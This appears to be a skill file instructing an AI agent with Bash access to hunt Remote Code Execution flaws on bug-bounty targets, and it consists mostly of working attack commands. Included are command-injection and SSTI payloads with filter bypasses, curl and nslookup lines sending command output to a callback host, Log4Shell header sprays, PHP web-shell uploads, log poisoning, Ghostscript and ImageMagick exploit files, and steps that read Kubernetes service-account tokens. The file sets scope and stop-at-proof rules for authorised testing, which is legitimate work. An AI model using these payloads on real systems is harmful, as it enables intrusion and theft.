me: rce-hunter
description: Hunt for Remote Code Execution vulnerabilities across all major pathways. Use when actively testing a target for RCE. Covers command injection, unsafe eval, SSTI, insecure deserialization, JNDI, file upload, LFI/RFI, parser exploits, and container escapes. Trigger on phrases like "test for RCE", "hunt RCE", "command injection", "SSTI", "deserialization", "file upload RCE", "LFI to RCE".
allowed-tools: Bash
---

# RCE Hunter

Target: $ARGUMENTS

All commands run directly in Ubuntu WSL. No SSH. Never write to /mnt/c/.

**RCE is Critical/P1 on every platform. This is the highest-value class of finding. Be methodical. PoC or GTFO.**

---

## ⛔ HARD STOP RULES

1. **Proof must be harmless and reversible.** Use `id`, `sleep`, DNS/HTTP callbacks only. Never delete files, exfiltrate real data, or modify production systems.
2. **OAST callback = confirmed.** A DNS or HTTP hit to your collaborator is sufficient PoC. Do not escalate further without explicit permission.
3. **Do not submit without a clean end-to-end PoC.** Timing alone is weak evidence — pair it with an OAST callback wherever possible.
4. **Stop at confirmation.** Once you have `id` output or a collaborator callback, that is your finding. Report it. Do not pivot to shells or deeper access.
5. **Scope check first.** Confirm the target asset is in scope before touching anything.

---

## Step 0 — Setup

```bash
export PATH=$PATH:~/go/bin
mkdir -p ~/bugbounty/$ARGUMENTS/rce
```

Set your OAST collaborator token (Burp Collaborator, interactsh, or canarytokens):

```bash
OAST="YOUR_TOKEN.oast.site"   # replace with your actual interactsh/collaborator host
TARGET="https://target.example.com"  # replace with actual target
```

Install interactsh-client if not present:

```bash
which interactsh-client || go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

---

## Pathway 1 — Command Injection (OS Exec Sinks)

### What to look for

Parameters that accept: filenames, search terms, paths, archive names, image operations, hostnames, IP addresses, domain names. Any endpoint that feels like it runs something server-side.

### Detection — Blackbox

**Time-based (low noise, start here):**

```bash
# Inject sleep into a suspected parameter
curl -s -X POST "$TARGET/endpoint" \
  -d 'param=test; sleep 7' \
  --max-time 15 -w "\nTime: %{time_total}s\n"

# Windows variant
curl -s "$TARGET/endpoint?param=test%26ping+-n+7+127.0.0.1+>NUL"
```

**OAST callback (strongest proof):**

```bash
# Linux — id in DNS path
curl -s "$TARGET/endpoint" -d "param=test; nslookup \$(id).$OAST"
curl -s "$TARGET/endpoint" -d "param=test; curl -m 3 https://$OAST/rce/\$(id)"

# Windows PowerShell
curl -s "$TARGET/endpoint" -d "param=test& powershell -c \"iwr https://$OAST/\$(whoami)\""
```

**Output difference (if response reflects execution):**

```bash
curl -s "$TARGET/endpoint?param=test; id"
curl -s "$TARGET/endpoint?param=test| id"
curl -s "$TARGET/endpoint?param=test&& id"
```

### Bypass Techniques

**No whitespace allowed:**
```bash
# Use IFS
param=test;${IFS}id
# Use braces
param=test;{id,-a}
# Tab character
param=test%09id
```

**Semicolons and pipes filtered:**
```bash
# Try newline
param=test%0aid
# Backticks
param=test`id`
# Dollar-paren
param=test$(id)
# Double ampersand
param=test&&id
# Double pipe
param=test||id
```

**Inside quotes:**
```bash
# Double quotes — break out or use substitution
param=ls";id;#"
param="$(id)"

# Single quotes — break out
param=ls';id;#'
```

### Blind Confirmation

```bash
# Timing
; sleep 7
& ping -n 7 127.0.0.1 >NUL

# DNS with command output in subdomain
; nslookup $(id).$OAST
; nslookup $(hostname).$OAST

# HTTP callback with context
; curl -s https://$OAST/$(id)_$(hostname)
```

### PoC Template (once confirmed)

```bash
# Capture id output for report
curl -s -X POST "$TARGET/vulnerable-endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=test; curl -s https://$OAST/poc/\$(id)"
```

---

## Pathway 2 — Unsafe Code Evaluation (eval/exec Sinks)

### What to look for

Features labelled: "expression," "formula," "rule," "filter," "advanced search," "calculation," "template," "script." Any field that evaluates user input server-side.

### Detection Probes

**Arithmetic eval check (safe, no side effects):**
```bash
# If 49 comes back instead of "7*7", it's being evaluated
curl -s "$TARGET/endpoint?expr=7*7"
curl -s "$TARGET/endpoint?expr={{7*7}}"
curl -s "$TARGET/endpoint?expr=\${7*7}"
curl -s "$TARGET/endpoint" -d '{"formula": "7*7"}'
```

**Language-specific timing probes:**
```bash
# Python
curl -s "$TARGET/endpoint" -d "expr=__import__('time').sleep(7)"

# Node.js
curl -s "$TARGET/endpoint" -d "expr=require('child_process').execSync('sleep 7')"

# PHP
curl -s "$TARGET/endpoint" -d "expr=sleep(7)"
```

**OAST callbacks:**
```bash
# Python
expr=__import__('os').popen('curl https://$OAST/$(id)').read()

# Node.js
expr=require('child_process').execSync('curl https://$OAST/$(id)')

# PHP
expr=system('curl https://$OAST/'.get_current_user())
```

### Filter Bypass

```bash
# Build strings at runtime — JS
String.fromCharCode(105,100)  # = "id"
global['pro'+'cess']['env']

# Python — split blacklisted tokens
getattr(__import__('os'),'sy'+'stem')('id')
__import__('builtins').__dict__['__im'+'port__']('os').system('id')
```

---

## Pathway 3 — Server Side Template Injection (SSTI)

### Detection — Confirm Evaluation

```bash
# Send arithmetic that should never equal 49 if treated as plain string
curl -s "$TARGET/endpoint?name={{7*7}}"     # Jinja2, Twig, Pug → expect 49
curl -s "$TARGET/endpoint?name=\${7*7}"     # FreeMarker, Thymeleaf → expect 49
curl -s "$TARGET/endpoint?name=<%= 7*7 %>"  # ERB, EJS → expect 49
```

### Engine Fingerprinting

```bash
# Jinja2 — string multiplication
{{7*'7'}}   # returns 7777777

# Twig
{{constant('PHP_VERSION')}}

# FreeMarker
${"freemarker.template.Version"?new()}

# ERB
<%= RUBY_VERSION %>
```

### OAST Callbacks per Engine

```bash
# Jinja2 timing
{{cycler.__init__.__globals__.__builtins__.__import__('time').sleep(7)}}

# Jinja2 OAST
{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('curl https://$OAST/$(id)').read()}}

# Node EJS
<%= require('http').get('https://$OAST/'+process.pid) %>

# Twig (if file_get_contents exposed)
{{file_get_contents('https://$OAST/')}}
```

### Save SSTI Payloads

```bash
cat > ~/bugbounty/$ARGUMENTS/rce/ssti-payloads.txt << 'EOF'
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
#{7*7}
*{7*7}
EOF
```

---

## Pathway 4 — Insecure Deserialization

### Fingerprinting by Platform

```bash
# Java — look for Base64 starting with rO0AB (= AC ED 00 05)
echo "rO0ABXNy" | base64 -d | xxd | head

# PHP — serialized objects look like O:8:"ClassName":...
# Python pickle — Base64 starting with gAS or bytes \x80\x04
# Ruby Marshal — bytes \x04\x08 (Base64: BAg...)
# .NET BinaryFormatter — look for ViewState or AAEAAAD in Base64
```

### Detection — Blackbox Canaries

```bash
# Java — send malformed but well-formed blob, watch for errors
curl -s "$TARGET/endpoint" \
  -H "Cookie: rememberMe=rO0ABXNy" \
  -v 2>&1 | grep -i "InvalidClassException\|ObjectInputStream\|java.io"

# PHP
curl -s "$TARGET/endpoint" \
  -d 'data=O:4:"X":0:{}' \
  -v 2>&1 | grep -i "unserialize\|offset"

# Python
curl -s "$TARGET/endpoint" \
  -d 'data=gASVAAAAAA==' \
  -v 2>&1 | grep -i "pickle\|UnpicklingError"
```

### Tools

```bash
# ysoserial for Java gadget chains — install if not present
ls ~/tools/ysoserial.jar 2>/dev/null || {
  mkdir -p ~/tools
  curl -sL https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
    -o ~/tools/ysoserial.jar
}

# Generate a DNS callback payload (safe proof)
java -jar ~/tools/ysoserial.jar URLDNS "https://$OAST/deser-test" | base64 -w 0
```

---

## Pathway 5 — JNDI / Remote Lookup Abuse (Log4Shell pattern)

### Where to Inject

Headers most likely to be logged:
```
X-Api-Version
User-Agent
X-Forwarded-For
Referer
X-Client-Id
Accept-Language
```

JSON body keys and values, contact form fields, integration URL fields.

### Canary Payloads

```bash
# Standard Log4Shell canary
JNDI_PAYLOAD="\${jndi:ldap://$OAST/jndi-test}"

curl -s "$TARGET/" \
  -H "X-Api-Version: $JNDI_PAYLOAD" \
  -H "User-Agent: $JNDI_PAYLOAD" \
  -H "X-Forwarded-For: $JNDI_PAYLOAD"

# RMI variant (different egress path)
curl -s "$TARGET/" -H "User-Agent: \${jndi:rmi://$OAST/a}"

# DNS only (strict egress)
curl -s "$TARGET/" -H "User-Agent: \${jndi:dns://$OAST/a}"
```

### Spray All Headers at Once

```bash
curl -s "$TARGET/" \
  -H "X-Api-Version: \${jndi:ldap://$OAST/h1}" \
  -H "User-Agent: \${jndi:ldap://$OAST/h2}" \
  -H "X-Forwarded-For: \${jndi:ldap://$OAST/h3}" \
  -H "Referer: \${jndi:ldap://$OAST/h4}" \
  -H "Accept-Language: \${jndi:ldap://$OAST/h5}" \
  -H "X-Client-Id: \${jndi:ldap://$OAST/h6}"
```

Watch your OAST dashboard for any DNS or HTTP hit. Each path suffix tells you which header triggered it.

---

## Pathway 6 — File Upload to Code Execution

### Step 1 — Find the Storage URL

```bash
# Upload a benign .txt and capture the response
curl -s -X POST "$TARGET/upload" \
  -F "file=@/tmp/test.txt" \
  -v 2>&1 | grep -i "location\|url\|path\|href"

# Common upload paths to check
for path in /uploads /files /media /assets /static /tmp; do
  curl -s -o /dev/null -w "%{http_code} $path/test.txt\n" "$TARGET$path/test.txt"
done
```

### Step 2 — Test Extension Handling

```bash
# Create test payloads
echo '<?php echo shell_exec("id"); ?>' > /tmp/shell.php
echo '<?php echo shell_exec("id"); ?>' > /tmp/shell.phtml
echo '<?php echo shell_exec("id"); ?>' > /tmp/shell.pHp
echo '<?php echo shell_exec("id"); ?>' > /tmp/shell.php.jpg
echo '<?php echo shell_exec("id"); ?>' > /tmp/shell.php%00.jpg

# Try each extension
for f in /tmp/shell.php /tmp/shell.phtml /tmp/shell.pHp; do
  echo "Trying: $f"
  curl -s -X POST "$TARGET/upload" -F "file=@$f"
done
```

### Step 3 — Content-Type Bypass

```bash
# Send PHP with image Content-Type
curl -s -X POST "$TARGET/upload" \
  -F "file=@/tmp/shell.php;type=image/jpeg"

# JPEG magic bytes + PHP payload (polyglot)
printf '\xFF\xD8\xFF\xE0JFIF<?php echo shell_exec("id"); ?>' > /tmp/polyglot.php
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/polyglot.php"
```

### Step 4 — htaccess / user.ini Upload

```bash
# Apache — make .jpg execute as PHP
echo 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/.htaccess"

# PHP-FPM — auto-prepend uploaded shell
echo 'auto_prepend_file=/var/www/html/uploads/shell.php' > /tmp/.user.ini
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/.user.ini"
```

### Step 5 — OAST-based PoC

```bash
# Blind callback payload
echo "<?php file_get_contents('https://$OAST/upload-rce/'.get_current_user()); ?>" \
  > /tmp/blind-shell.php
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/blind-shell.php"
```

---

## Pathway 7 — LFI / RFI to Code Execution

### Step 1 — Detect LFI

Common vulnerable parameter names: `page`, `template`, `view`, `lang`, `file`, `include`, `theme`, `load`, `preview`

```bash
# Linux path traversal
for param in page template view lang file include theme load; do
  result=$(curl -s "$TARGET/?$param=../../../../etc/passwd")
  echo "$result" | grep -q "root:x:0:0" && echo "LFI FOUND: $param"
done

# Windows
curl -s "$TARGET/?page=../../../../Windows/win.ini" | grep -i "for 16-bit"
```

### Step 2 — Source Code Disclosure via PHP Wrappers

```bash
# Read index.php source — turns blackbox to whitebox
curl -s "$TARGET/?page=php://filter/convert.base64-encode/resource=index.php" \
  | grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d 2>/dev/null | head -50

# Read config files
curl -s "$TARGET/?page=php://filter/convert.base64-encode/resource=config.php" \
  | grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d 2>/dev/null
```

### Step 3 — Log Poisoning to RCE

```bash
# Step 1: Poison the access log with PHP code in User-Agent
curl -s "$TARGET/" -H "User-Agent: <?php echo shell_exec('id'); ?>"

# Step 2: Include the log file
for log in \
  "../../../../var/log/apache2/access.log" \
  "../../../../var/log/nginx/access.log" \
  "../../../../var/log/httpd/access_log" \
  "../../../../proc/self/environ"; do
  result=$(curl -s "$TARGET/?page=$log")
  echo "$result" | grep -qiE "uid=[0-9]" && echo "LOG POISONING RCE: $log"
done
```

### Step 4 — PHP Session File Inclusion

```bash
# Get your PHPSESSID from a normal session
SESSID=$(curl -s -c /tmp/cookies.txt "$TARGET/login" -o /dev/null \
  && grep PHPSESSID /tmp/cookies.txt | awk '{print $7}')

# Poison your session with PHP code
curl -s -b "PHPSESSID=$SESSID" "$TARGET/?name=<?php+echo+shell_exec('id');?>"

# Include the session file
curl -s -b "PHPSESSID=$SESSID" \
  "$TARGET/?page=../../../../var/lib/php/sessions/sess_$SESSID"
```

### Step 5 — RFI Check

```bash
# Host a simple PHP file on your machine first:
# echo '<?php echo shell_exec("id"); ?>' > /tmp/r.txt
# python3 -m http.server 8080

# Test RFI
curl -s "$TARGET/?page=http://YOUR_IP:8080/r.txt"
curl -s "$TARGET/?page=https://$OAST/rfi-test"
```

---

## Pathway 8 — Parser / Converter Exploits

### Step 1 — Fingerprint the Converter

```bash
# Upload a valid image and see if it gets resized/re-encoded
curl -s -X POST "$TARGET/upload" \
  -F "file=@/tmp/test.jpg" -v 2>&1 | grep -i "content-type\|x-powered\|server"

# Send mismatched extension to check if backend sniffs format
printf '%!PS-Adobe-3.0\n' > /tmp/test.jpg
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/test.jpg" -v 2>&1 | grep -i "error\|format"
```

### Step 2 — SVG SSRF / OAST Probe

```bash
cat > /tmp/probe.svg << EOF
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <image href="https://$OAST/svg-probe" width="1" height="1"/>
</svg>
EOF
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/probe.svg"
```

### Step 3 — ImageMagick MVG (disguised as JPG)

```bash
cat > /tmp/exploit.jpg << EOF
push graphic-context
viewbox 0 0 1 1
fill 'url(https://$OAST/mvg-rce)'
pop graphic-context
EOF
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/exploit.jpg"
```

### Step 4 — Ghostscript via PDF/PS/EPS

```bash
cat > /tmp/exploit.ps << EOF
%!PS
/shellstr (/bin/sh) def
shellstr (curl https://$OAST/gs-rce/$(id)) exec
EOF
curl -s -X POST "$TARGET/upload" -F "file=@/tmp/exploit.ps"
```

---

## Pathway 9 — Container Escape (post-RCE escalation)

Only run this if you already have confirmed code execution inside a container.

```bash
# Am I in a container?
test -f /.dockerenv && echo "Docker confirmed" || echo "Not Docker"
grep -E 'docker|kubepods|containerd' /proc/1/cgroup 2>/dev/null

# Docker socket exposed?
ls -l /var/run/docker.sock 2>/dev/null \
  /run/containerd/containerd.sock 2>/dev/null \
  /var/run/crio/crio.sock 2>/dev/null

# Kubernetes service account credentials
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -5

# Host filesystem mounted?
ls -ld /host /rootfs /node /var/lib/docker /var/run 2>/dev/null
mount | grep -E '/host|/rootfs' 2>/dev/null

# Dangerous capabilities?
capsh --print 2>/dev/null | grep -i "cap_sys_admin\|cap_net_admin\|cap_sys_ptrace"
```

**If docker socket found:**
```bash
# Prove access — harmless check only
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

Stop here. This is sufficient for a Critical finding. Document and report.

---

## Documentation Template

For every pathway, save results:

```bash
cat >> ~/bugbounty/$ARGUMENTS/rce/findings.md << EOF

## $(date +%Y-%m-%d %H:%M) — RCE Candidate
**Pathway:** [Command Injection / SSTI / Deserialization / etc.]
**Endpoint:** [exact URL]
**Method:** [GET/POST/etc.]
**Parameter:** [exact param name]
**Payload Used:** [exact payload]
**Evidence:** [OAST callback / timing delta / output]
**Request:**
\`\`\`
curl command here
\`\`\`
**Response/Proof:** [what came back]
**Status:** [Confirmed / Suspected / Ruled Out]
EOF
```

---

## Severity Reference

| Finding | Platform Severity |
|---|---|
| RCE confirmed with `id` output or OAST callback | Critical / P1 on all platforms |
| Blind RCE confirmed via timing only | High / P1 — pair with OAST to get Critical |
| LFI without code execution | Medium / P3 |
| File upload stored but not executed | Medium / P3 |
| JNDI DNS callback only, no execution | High / P2 — still very reportable |
| Container escape confirmed | Critical / P1 |

---

## Hard Rules

- **Proof must be harmless.** `id`, `sleep`, DNS/HTTP callbacks only. Never touch real data.
- **Stop at confirmation.** OAST callback = done. Report it.
- **Document everything.** Every request, every response, exact payloads used.
- **One confirmed RCE = immediate report.** Do not chain further without explicit permission.
- **Run `/triager` before submitting.** Even RCE reports get rejected for weak evidence.
- **Never write files to /mnt/c/.** All output stays in `~/bugbounty/` in Ubuntu WSL.
